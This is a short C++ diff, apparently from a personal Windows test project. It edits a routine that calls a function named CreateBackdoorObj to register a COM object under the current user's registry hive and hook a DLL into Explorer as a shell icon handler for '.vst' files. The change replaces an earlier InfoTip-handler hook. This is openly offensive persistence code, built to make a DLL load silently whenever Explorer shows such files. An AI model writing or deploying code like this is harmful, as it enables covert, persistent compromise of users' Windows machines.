@@ -5,8 +5,9 @@
 int wmain()
 {
 
-	std::wstring dllPath = L"c:\\users\\AliSAhmad\\source\\repos\\Test004\\x64\\Debug\\Test004.5.dll";
+	std::wstring dllPath = L"C:\\Users\\AliSAhmad\\source\\repos\\Test004\\x64\\Debug\\ATLIconHandler.dll";
 	GUID guid = reg::CreateBackdoorObj(HKCU, dllPath);
-	reg::AddTechnique(INFOTIP_HANDLER, NULL, guid);
+	std::wstring ext = L".vst";
+	reg::AddTechnique(ICON_HANDLER, (WCHAR *)ext.c_str(), guid);
 
 }
